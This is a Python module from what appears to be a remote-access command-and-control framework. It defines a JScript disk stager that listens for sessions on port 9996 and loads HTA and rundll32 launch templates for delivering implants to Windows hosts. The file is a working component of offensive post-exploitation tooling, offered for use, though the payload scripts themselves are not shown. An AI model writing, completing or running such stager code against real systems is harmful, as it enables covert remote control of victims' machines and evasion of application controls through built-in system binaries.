import core.stager
import core.loader

class DiskStager(core.stager.StagerWizard):

    NAME = "JScript Disk Stager"
    DESCRIPTION = "Listens for new sessions, using disk for payloads."
    AUTHORS = ['Entynetproject']

    WORKLOAD = "js"

    def load(self):
        #self.options.set("SRVPORT", 9996)
        self.port = 9996

        self.stdlib = core.loader.load_script('data/stager/js/stdlib.js')
        self.stage = core.loader.load_script('data/stager/js/stage.js')
        self.stagetemplate = core.loader.load_script("data/stager/js/mshta/template.hta")
        self.stagecmd = core.loader.load_script("data/stager/js/mshta/mshta.cmd")
        self.forktemplate = self.stagetemplate
        self.forkcmd = core.loader.load_script("data/stager/js/rundll32/rundll32.cmd")
        self.workload = "js"
